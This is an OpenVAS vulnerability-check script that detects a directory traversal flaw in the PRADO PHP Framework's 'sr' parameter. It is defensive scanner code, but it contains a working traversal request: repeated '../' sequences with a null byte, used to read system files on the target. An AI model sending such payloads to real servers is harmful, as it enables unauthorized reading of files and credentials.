###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_prado_php_framework_dir_trav_vuln.nasl 11374 2018-09-13 12:45:05Z asteins $
#
# PRADO PHP Framework 'sr' Parameter Multiple Directory Traversal Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803116");
  script_version("$Revision: 11374 $");
  script_bugtraq_id(56677);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-13 14:45:05 +0200 (Thu, 13 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-11-27 15:16:12 +0530 (Tue, 27 Nov 2012)");
  script_name("PRADO PHP Framework 'sr' Parameter Multiple Directory Traversal Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/22937/");
  script_xref(name:"URL", value:"http://cxsecurity.com/issue/WLB-2012110184");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/118348/ZSL-2012-5113.txt");
  script_xref(name:"URL", value:"http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5113.php");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to perform
  directory traversal attacks and read arbitrary files on the affected application.");

  script_tag(name:"affected", value:"PRADO PHP Framework version 3.2.0 (r3169)");

  script_tag(name:"insight", value:"Input passed to the 'sr' parameter in 'functional_tests.php' and
  'functional.php'is not properly sanitised before being used to get the contents of a resource.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running PRADO PHP Framework and is prone to
  multiple directory traversal vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

webPort = get_http_port(default:80);

if(!can_host_php(port:webPort)){
  exit(0);
}

files = traversal_files();

foreach dir (make_list_unique("/prado", "/", cgi_dirs(port:webPort))){

  if(dir == "/") dir = "";
  url = dir + "/";

  if(http_vuln_check(port:webPort, url:url, pattern:">PRADO Framework for PHP",
     check_header:TRUE, extra_check:make_list('>Prado Software<',
     '>PRADO QuickStart Tutorial<','>PRADO Blog<'))){

    foreach file (keys(files)){

      url = dir + "/tests/test_tools/functional_tests.php?sr=" + crap(data:"../", length:3*15) + files[file] + "%00";

      if(http_vuln_check(port:webPort, url:url, check_header:TRUE, pattern:file)){
        report = report_vuln_url(port:webPort, url:url);
        security_message(port:webPort, data:report);
        exit(0);
      }
    }
  }
}

exit(99);